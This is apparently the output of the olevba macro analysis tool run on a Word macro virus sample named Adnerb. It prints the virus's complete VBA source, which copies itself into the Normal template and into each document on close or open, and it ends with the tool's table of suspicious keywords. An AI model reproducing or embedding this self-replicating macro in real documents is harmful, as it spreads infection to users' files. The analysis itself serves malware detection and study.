olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Adnerb-75a5410ad4a30230082e7e3d331e889eed2bf127
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Żf¬r´ú¸Ő.cls 
in file: Virus.MSWord.Adnerb-75a5410ad4a30230082e7e3d331e889eed2bf127 - OLE stream: 'Macros/VBA/Żf¬r´ú¸Ő'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Set Ns = NormalTemplate.VBProject.VBComponents.Item(1)
Set Ds = ActiveDocument.VBProject.VBComponents.Item(1)
Na = Ns.CodeModule.CountOfLines
Da = Ds.CodeModule.CountOfLines
k = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ReDim kk(k)
For i = 1 To k
   kk(i) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Next i
If Na = 0 Then
    Ns.CodeModule.AddFromString "Private Sub Document_Close()"
    For i = 2 To k
        Ns.CodeModule.InsertLines i, kk(i)
    Next i
    Ns.Name = "Żf¬r´ú¸Ő"
End If
If Da = 0 Then
    Ds.CodeModule.AddFromString "Private Sub Document_Open()"
    For i = 2 To k
        Ds.CodeModule.InsertLines i, kk(i)
    Next i
End If
If Second(Now) Mod 10 > 5 Then MsgBox "°ę¨ľłˇłq¸ę§˝łq¸ę¦wĄţłB" & Chr(10) & Chr(13) & Chr(10) & Chr(13) & "Żf¬r·P¬V¸ŐĹçˇI"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
